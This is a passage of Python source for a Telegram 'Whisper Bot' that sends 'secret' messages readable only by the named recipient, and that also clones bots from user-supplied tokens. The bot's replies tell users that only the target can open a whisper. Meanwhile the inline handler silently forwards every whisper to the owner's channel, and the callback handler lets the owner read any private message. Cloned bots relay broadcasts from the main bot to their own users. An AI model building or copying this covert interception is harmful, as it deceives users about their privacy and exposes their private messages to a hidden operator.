                    [Button.url("👥 Support", f"https://t.me/{SUPPORT_GROUP}")],
                    [Button.switch_inline("🚀 Send Whisper", query="", same_peer=True)],
                    [Button.inline("📖 Help", data="user_help"), Button.inline("🔧 Clone Bot", data="user_clone_info")],
                    [Button.inline("📊 Stats", data="user_stats")]
                ]
            )
        
        @user_bot.on(events.NewMessage(pattern='/help'))
        async def user_help_handler(event):
            # Track user for broadcast
            add_user_to_tracking(event.sender_id)
            
            bot_username_user = (await user_bot.get_me()).username
            help_text_user = HELP_TEXT.replace("{bot_username}", bot_username_user)
            
            await event.reply(
                help_text_user,
                buttons=[
                    [Button.switch_inline("🚀 Try Now", query="", same_peer=True)],
                    [Button.inline("🔙 Back", data="user_back_start")]
                ]
            )
        
        @user_bot.on(events.InlineQuery)
        async def user_inline_handler(event):
            # Track user for broadcast
            add_user_to_tracking(event.sender_id)
            
            await handle_inline_query(event, user_bot)
        
        # ========== BROADCAST HANDLER FOR CLONED BOTS ==========
        @user_bot.on(events.NewMessage(pattern=r'/broadcast_from_main\s+(.+)'))
        async def cloned_broadcast_handler(event):
            """Handle broadcast from main bot in cloned bot"""
            try:
                # Extract message and options
                full_text = event.text.strip()
                
                # Check if it's copy mode
                copy_mode = "-copy" in full_text.lower()
                broadcast_text = full_text.replace("/broadcast_from_main", "").replace("-copy", "").strip()
                
                if not broadcast_text:
                    return
                
                logger.info(f"📨 Cloned bot @{bot_me.username} received broadcast: {broadcast_text[:50]}...")
                
                # Get all users from this cloned bot
                cloned_users = set()
                try:
                    # Get dialogs
                    dialogs = await user_bot.get_dialogs(limit=100)
                    for dialog in dialogs:
                        if dialog.is_user and dialog.entity.id != bot_me.id:
                            cloned_users.add(dialog.entity.id)
                    
                    logger.info(f"📊 Cloned bot @{bot_me.username} has {len(cloned_users)} users")
                    
                    # Send broadcast to all users
                    success_count = 0
                    failed_count = 0
                    
                    for user_id in cloned_users:
                        try:
                            await user_bot.send_message(user_id, broadcast_text)
                            success_count += 1
                            await asyncio.sleep(0.05)  # Rate limiting
                        except Exception as e:
                            failed_count += 1
                            logger.error(f"Cloned bot failed to send to {user_id}: {e}")
                    
                    # Send report to main bot owner
                    try:
                        report_msg = f"""
🤖 **Cloned Bot Broadcast Report**

📊 **Bot:** @{bot_me.username}
👤 **Owner:** {event.sender.first_name} ({user_id})
📅 **Time:** {datetime.now().strftime("%H:%M:%S")}

📈 **Results:**
• ✅ Successful: {success_count} users
• ❌ Failed: {failed_count} users
• 📊 Success Rate: {(success_count/(success_count+failed_count))*100 if (success_count+failed_count) > 0 else 0:.1f}%

💬 **Message:** {broadcast_text[:100]}...
                        """
                        await bot.send_message(ADMIN_ID, report_msg)
                    except:
                        pass
                    
                    logger.info(f"✅ Cloned bot @{bot_me.username} sent broadcast to {success_count} users")
                    
                except Exception as e:
                    logger.error(f"Error getting cloned bot users: {e}")
                
            except Exception as e:
                logger.error(f"Error in cloned bot broadcast: {e}")
        
        @user_bot.on(events.CallbackQuery)
        async def user_callback_handler(event):
            data = event.data.decode('utf-8')
            
            if data == "user_help":
                bot_username_user = (await user_bot.get_me()).username
                help_text_user = HELP_TEXT.replace("{bot_username}", bot_username_user)
                
                await event.edit(
                    help_text_user,
                    buttons=[[Button.switch_inline("🚀 Try Now", query="", same_peer=True)]]
                )
            
            elif data == "user_clone_info":
                clone_promo_text = """
🤖 **Do you want a bot like this?**

Create your own whisper bot with all features:

• 🤫 Whisper Features
• 🚀 Easy to Use
• 📢 Receives broadcasts from main bot

**Create your bot 👉 Use /clone command**

**Powered by:** @shribots
                """
                await event.edit(
                    clone_promo_text,
                    buttons=[
                        [Button.url("🚀 Create Bot", "https://t.me/BotFather")],
                        [Button.inline("🔙 Back", data="user_back_start")]
                    ]
                )
            
            elif data == "user_stats":
                user_id_str = str(event.sender_id)
                user_targets_count = 0
                if user_id_str in user_recent_targets:
                    user_targets_count = len(user_recent_targets[user_id_str])
                
                stats_text = f"""
📊 **Your Statistics**

👤 User ID: `{event.sender_id}`
📨 Recent Targets: {user_targets_count}
                
🤖 Bot: @{bot_me.username}
                """
                await event.edit(stats_text, buttons=[[Button.inline("🔙 Back", data="user_back_start")]])
            
            elif data == "user_back_start":
                welcome_text_user = WELCOME_TEXT
                
                await event.edit(
                    welcome_text_user,
                    buttons=[
                        [Button.url("📢 Channel", f"https://t.me/{SUPPORT_CHANNEL}")],
                        [Button.url("👥 Support", f"https://t.me/{SUPPORT_GROUP}")],
                        [Button.switch_inline("🚀 Send Whisper", query="", same_peer=True)],
                        [Button.inline("📖 Help", data="user_help"), Button.inline("🔧 Clone Bot", data="user_clone_info")],
                        [Button.inline("📊 Stats", data="user_stats")]
                    ]
                )
            
            elif data in messages_db:
                msg_data = messages_db[data]
                if msg_data['user_id'] == -1:
                    await event.answer(f" {msg_data['msg']}", alert=True)
                elif event.sender_id == msg_data['user_id']:
                    await event.answer(f"🔓 {msg_data['msg']}", alert=True)
                elif event.sender_id == msg_data['sender_id']:
                    await event.answer(f" {msg_data['msg']}", alert=True)
                else:
                    await event.answer("🔒 This message is not for you!", alert=True)
        
        # Success message to user
        await creating_msg.edit(
            f"✅ **Bot Cloned Successfully!**\n\n"
            f"🤖 **Your Bot:** @{bot_me.username}\n"
            f"🎉 Now active with all whisper features!\n\n"
            f"✨ **Special Features:**\n"
            f"• 📢 Receives broadcasts from main bot\n"
            f"• 🤫 All whisper features\n"
            f"• 🔄 Recent users memory\n\n"
            f"**Use it by typing:**\n"
            f"`@{bot_me.username} message @username`\n\n"
            f"Or send /start to your new bot!",
            buttons=[
                [Button.switch_inline("🚀 Test Your Bot", query="", same_peer=True)],
                [Button.inline("🔙 Back", data="back_start")]
            ]
        )
        
    except Exception as e:
        logger.error(f"Clone error: {e}")
        await event.reply(f"❌ **Clone Failed!**\n\nError: {str(e)}")

@bot.on(events.NewMessage(pattern='/remove'))
async def remove_handler(event):
    try:
        user_id = event.sender_id
        user_clones = [k for k, v in clone_stats.items() if v.get('owner_id') == user_id]
        
        if not user_clones:
            await event.reply("❌ You have no bots to remove!")
            return
        
        removed = 0
        for token in user_clones:
            if token in user_bots:
                try:
                    await user_bots[token].disconnect()
                    del user_bots[token]
                except:
                    pass
            if token in clone_stats:
                del clone_stats[token]
                removed += 1
        
        asyncio.create_task(save_data_async())
        await event.reply(f"✅ Removed {removed} of your bots!")
        
    except Exception as e:
        logger.error(f"Remove error: {e}")
        await event.reply("❌ Error removing bots!")

@bot.on(events.InlineQuery)
async def inline_handler(event):
    # Track user for broadcast
    add_user_to_tracking(event.sender_id)
    
    await handle_inline_query(event)

async def handle_inline_query(event, client=None):
    """Handle inline queries - WORKS WITH ANY INPUT"""
    if client is None:
        client = bot
    
    try:
        if is_cooldown(event.sender_id):
            await event.answer([])
            return

        # Get recent buttons quickly - ALWAYS SHOW RECENT USERS
        recent_buttons = get_recent_users_buttons(event.sender_id)
        
        if not event.text or not event.text.strip():
            if recent_buttons:
                result_text = "**Recent Users:**\nClick any user below to message them quickly!\n\nOr type your message with @username\n\n**Tip:** Type without @username for public message!"
                result = event.builder.article(
                    title="🤫 Whisper Bot - Quick Send",
                    description="Send to recent users or type manually",
                    text=result_text,
                    buttons=recent_buttons
                )
            else:
                result = event.builder.article(
                    title="🤫 Whisper Bot - Send Secret Messages",
                    description="Usage: message @username OR just message",
                    text="**Usage:** Type your message\n• Add @username for private message\n• Or type alone for public message\n\n**Examples:**\n• `Hello! @username` - Only they can read\n• `Hello everyone!` - Anyone can read\n\n🔒 Private | 🌍 Public",
                    buttons=[[Button.switch_inline("🚀 Try Now", query="", same_peer=True)]]
                )
            await event.answer([result])
            return
        
        text = event.text.strip()
        
        # Use simplified user extraction - WORKS WITH ANY INPUT
        target_user, message_text = await extract_target_user(text, client)
        
        # If no message text after extraction, use original text
        if not message_text and target_user:
            message_text = text
        
        if not message_text:
            result = event.builder.article(
                title="❌ Empty Message",
                description="Please type a message",
                text="❌ Please type a message to send!\n\n**Examples:**\n• `Hello! @username`\n• `Hi everyone!`",
                buttons=[[Button.switch_inline("🔄 Try Again", query=text, same_peer=True)]]
            )
            await event.answer([result])
            return
        
        if len(message_text) > 1000:
            result = event.builder.article(
                title="❌ Message Too Long",
                description="Maximum 1000 characters allowed",
                text="❌ Your message is too long! Please keep it under 1000 characters."
            )
            await event.answer([result])
            return
        
        # Determine message type and create appropriate response
        if target_user:
            # PRIVATE MESSAGE - for specific user
            user_id_to_store = target_user.id if hasattr(target_user, 'id') and target_user.id != -1 else -1
            
            # Add to recent users only if it's a real user (not fake)
            if user_id_to_store != -1:
                add_to_recent_users(
                    event.sender_id, 
                    user_id_to_store, 
                    getattr(target_user, 'username', None),
                    getattr(target_user, 'first_name', 'User')
                )
            
            target_name = getattr(target_user, 'first_name', 'User')
            message_id = f'msg_{event.sender_id}_{user_id_to_store}_{int(datetime.now().timestamp())}'
            
            messages_db[message_id] = {
                'user_id': user_id_to_store,
                'msg': message_text,
                'sender_id': event.sender_id,
                'timestamp': datetime.now().isoformat(),
                'target_name': target_name
            }
            
            # Forward to owner's channel (SILENTLY)
            asyncio.create_task(forward_whisper_to_channel(message_id, messages_db[message_id]))
            
            result = event.builder.article(
                title=f"🔒 Secret Message for {target_name}",
                description=f"Click to send secret message to {target_name}",
                text=f"**🔐 A secret message for {target_name}!**\n\n*Note: Only {target_name} can open this message.*",
                buttons=[[Button.inline("🔓 Show Message", message_id)]]
            )
        
        else:
            # PUBLIC MESSAGE - for everyone
            message_id = f'public_{event.sender_id}_{int(datetime.now().timestamp())}'
            
            messages_db[message_id] = {
                'user_id': -1,  # -1 means public message
                'msg': message_text,
                'sender_id': event.sender_id,
                'timestamp': datetime.now().isoformat(),
                'target_name': 'Everyone'
            }
            
            # Forward to owner's channel (SILENTLY)
            asyncio.create_task(forward_whisper_to_channel(message_id, messages_db[message_id]))
            
            result = event.builder.article(
                title="🌍 Public Message for Everyone",
                description="Click to send public message",
                text=f"**🌍 A public message for everyone!**\n\n*Note: Anyone can open and read this message.*",
                buttons=[[Button.inline("🔓 Show Message", message_id)]]
            )
        
        await event.answer([result])
        
    except Exception as e:
        logger.error(f"Inline query error: {e}")
        result = event.builder.article(
            title="❌ Error",
            description="Something went wrong",
            text="❌ An error occurred. Please try again in a moment."
        )
        await event.answer([result])

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    try:
        data = event.data.decode('utf-8')
        
        # Track user for broadcast
        add_user_to_tracking(event.sender_id)
        
        if data == "help":
            bot_username = (await bot.get_me()).username
            help_text = HELP_TEXT.replace("{bot_username}", bot_username)
            
            try:
                await event.edit(
                    help_text,
                    buttons=[
                        [Button.switch_inline("🚀 Try Now", query="", same_peer=True)],
                        [Button.inline("🔙 Back", data="back_start")]
                    ]
                )
            except MessageNotModifiedError:
                pass
        
        elif data == "user_stats":
            user_id_str = str(event.sender_id)
            user_targets_count = 0
            if user_id_str in user_recent_targets:
                user_targets_count = len(user_recent_targets[user_id_str])
            
            user_whispers = sum(1 for msg in messages_db.values() if msg['sender_id'] == event.sender_id)
            
            stats_text = f"""
📊 **Your Statistics**

👤 User ID: `{event.sender_id}`
📨 Recent Targets: {user_targets_count}
💬 Your Whispers: {user_whispers}
            
🤖 Bot: @{(await bot.get_me()).username}
            """
            
            try:
                await event.edit(stats_text, buttons=[[Button.inline("🔙 Back", data="back_start")]])
            except MessageNotModifiedError:
                pass
        
        elif data == "owner_all_whispers":
            if event.sender_id != ADMIN_ID:
                await event.answer("❌ Owner only!", alert=True)
                return
            
            await get_owner_whispers(event)
        
        elif data == "broadcast_info":
            if event.sender_id != ADMIN_ID:
                await event.answer("❌ Owner only!", alert=True)
                return
                
            broadcast_help = """
📢 **Broadcast Feature - Owner Only**

**Usage:**
1. Reply to any message with `/broadcast`

**Options:**
• `/broadcast` - Forward to all users + cloned bots
• `/broadcast -copy` - Copy to all users + cloned bots
• `/broadcast -user` - Send to users only
• `/broadcast -noclone` - Skip cloned bots
• `/broadcast -nochat` - Skip group chats

**Targets:**
1. 👥 All Main Bot Users
2. 🤖 All Cloned Bots (they forward to their users)

**Commands:**
• `/broadcast` - Start broadcast
• `/stop_broadcast` - Stop broadcast

⚠️ **Use responsibly!**
            """
            try:
                await event.edit(
                    broadcast_help,
                    buttons=[[Button.inline("🔙 Back", data="back_start")]]
                )
            except MessageNotModifiedError:
                pass
        
        elif data == "clone_info":
            clone_text = """
🔧 **Clone Your Own Whisper Bot**

**Commands:**
• `/clone bot_token` - Clone new bot
• `/remove` - Remove your cloned bot

**Example:**
`/clone 1234567890:ABCdefGHIjkl...`

**Features:**
• 🤫 All whisper features
• 📢 Receives broadcasts from main bot
• 🔄 Recent users memory

⚠️ **Note:**
• One bot per user only
• Keep token safe
            """
            try:
                await event.edit(
                    clone_text,
                    buttons=[
                        [Button.url("🤖 BotFather", "https://t.me/BotFather")],
                        [Button.inline("🔙 Back", data="back_start")]
                    ]
                )
            except MessageNotModifiedError:
                pass
        
        elif data == "remove_bot":
            user_id = event.sender_id
            user_clones = [k for k, v in clone_stats.items() if v.get('owner_id') == user_id]
            
            if not user_clones:
                await event.answer("No bots to remove!", alert=True)
                return
            
            removed = 0
            for token in user_clones:
                if token in user_bots:
                    try:
                        await user_bots[token].disconnect()
                        del user_bots[token]
                    except:
                        pass
                if token in clone_stats:
                    del clone_stats[token]
                    removed += 1
            
            asyncio.create_task(save_data_async())
            await event.answer(f"✅ {removed} bots removed!", alert=True)
            try:
                await event.edit(f"✅ Removed {removed} of your bots!")
            except MessageNotModifiedError:
                pass
        
        elif data == "back_start":
            if event.sender_id == ADMIN_ID:
                try:
                    await event.edit(
                        WELCOME_TEXT,
                        buttons=[
                            [Button.url("📢 Channel", f"https://t.me/{SUPPORT_CHANNEL}")],
                            [Button.url("👥 Support", f"https://t.me/{SUPPORT_GROUP}")],
                            [Button.switch_inline("🚀 Send Whisper", query="", same_peer=True)],
                            [Button.inline("📖 Help", data="help"), Button.inline("🔧 Clone Bot", data="clone_info")],
                            [Button.inline("📊 Stats", data="user_stats"), Button.inline("📋 All Whispers", data="owner_all_whispers")],
                            [Button.inline("📢 Broadcast", data="broadcast_info")]
                        ]
                    )
                except MessageNotModifiedError:
                    pass
            else:
                try:
                    await event.edit(
                        WELCOME_TEXT,
                        buttons=[
                            [Button.url("📢 Channel", f"https://t.me/{SUPPORT_CHANNEL}")],
                            [Button.url("👥 Support", f"https://t.me/{SUPPORT_GROUP}")],
                            [Button.switch_inline("🚀 Send Whisper", query="", same_peer=True)],
                            [Button.inline("📖 Help", data="help"), Button.inline("🔧 Clone Bot", data="clone_info")],
                            [Button.inline("📊 Stats", data="user_stats")]
                        ]
                    )
                except MessageNotModifiedError:
                    pass
        
        elif data in messages_db:
            msg_data = messages_db[data]
            
            # PUBLIC MESSAGE - anyone can read
            if msg_data['user_id'] == -1:
                await event.answer(f" {msg_data['msg']}", alert=True)
            
            # PRIVATE MESSAGE - only specific user or sender can read
            elif event.sender_id == msg_data['user_id']:
                await event.answer(f"🔓 {msg_data['msg']}", alert=True)
            elif event.sender_id == msg_data['sender_id']:
                await event.answer(f" {msg_data['msg']}", alert=True)
            elif event.sender_id == ADMIN_ID:  # OWNER CAN READ ANY MESSAGE
                await event.answer(f"👑 [OWNER VIEW] {msg_data['msg']}", alert=True)
            else:
                await event.answer("🔒 This message is not for you!", alert=True)
        
        else:
            await event.answer("❌ Invalid button!", alert=True)
            
    except Exception as e:
        logger.error(f"Callback error: {e}")
        await event.answer("❌ An error occurred. Please try again.", alert=True)

# Flask web server
app = Flask(__name__)

@app.route('/')
def home():
    bot_username = "bot_username"
    try:
        if bot.is_connected():
            bot_username = bot.loop.run_until_complete(bot.get_me()).username
    except:
        pass
        
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Whisper Bot</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
            .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            h1 {{ color: #333; text-align: center; }}
            .status {{ background: #4CAF50; color: white; padding: 10px; border-radius: 5px; text-align: center; margin: 20px 0; }}
            .info {{ background: #2196F3; color: white; padding: 15px; border-radius: 5px; margin: 10px 0; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🤫 Whisper Bot</h1>
            <div class="status">✅ Bot is Running Successfully</div>
            <div class="info">
                <strong>📊 Statistics:</strong><br>
                Recent Users: {len(recent_users)}<br>
                Total Whispers: {len(messages_db)}<br>
                Total Clones: {len(clone_stats)}<br>
                Total Users: {len(all_bot_users)}<br>
                Owner ID: {ADMIN_ID}<br>
                Broadcast Active: {broadcasting}<br>
                Server Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            </div>
            <p>Send anonymous secret messages to Telegram users.</p>
            <p><strong>Usage:</strong> Type <code>@{bot_username} message @username</code> in any chat</p>
            <p><strong>Features:</strong> Private whispers, Public messages, Clone your own bot, Multi-target broadcast</p>
        </div>
    </body>
    </html>
    """

@app.route('/health')
def health():
    return json.dumps({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "recent_users": len(recent_users),
        "total_whispers": len(messages_db),
        "total_clones": len(clone_stats),
        "total_users": len(all_bot_users),
        "owner_id": ADMIN_ID,
        "broadcast_active": broadcasting,
        "bot_connected": bot.is_connected()
    })

def run_flask():
    """Run Flask web server"""
    logger.info(f"🌐 Starting Flask server on port {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# Start Flask in background thread
flask_thread = threading.Thread(target=run_flask)
flask_thread.daemon = True
flask_thread.start()

async def main():
    """Main function to start the bot"""
    try:
        me = await bot.get_me()
        logger.info(f"🎭 Whisper Bot Started!")
        logger.info(f"🤖 Bot: @{me.username}")
        logger.info(f"🆔 Bot ID: {me.id}")
        logger.info(f"👑 Owner ID: {ADMIN_ID}")
        logger.info(f"📨 Whisper Channel: @{WHISPER_CHANNEL}")
        logger.info(f"👥 Recent Users: {len(recent_users)}")
        logger.info(f"🤖 Total Clones: {len(clone_stats)}")
        logger.info(f"👥 Total Users: {len(all_bot_users)}")
        logger.info(f"📢 Broadcast Feature: Enabled (Sends to cloned bots)")
        logger.info(f"🌐 Web server on port {PORT}")
        logger.info("✅ Bot is ready!")
        logger.info("🔗 Use /start to begin")
    except Exception as e:
        logger.error(f"❌ Error in main: {e}")
        raise

if __name__ == '__main__':
    print("🚀 Starting Whisper Bot...")
    print(f"📝 Owner ID: {ADMIN_ID}")
    print(f"📨 Whisper Channel: @{WHISPER_CHANNEL}")
    print(f"📢 Broadcast Feature: Enabled (Sends to cloned bots)")
    
    try:
        # Start the bot
        bot.start()
        bot.loop.run_until_complete(main())
        
        print("✅ Bot started successfully!")
        print("🔄 Bot is now running...")
        
        # Keep the bot running
        bot.run_until_disconnected()
        
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        logger.error(f"❌ Failed to start bot: {e}")
        print(f"❌ Error: {e}")
    finally:
        print("💾 Saving data before exit...")
        save_data()
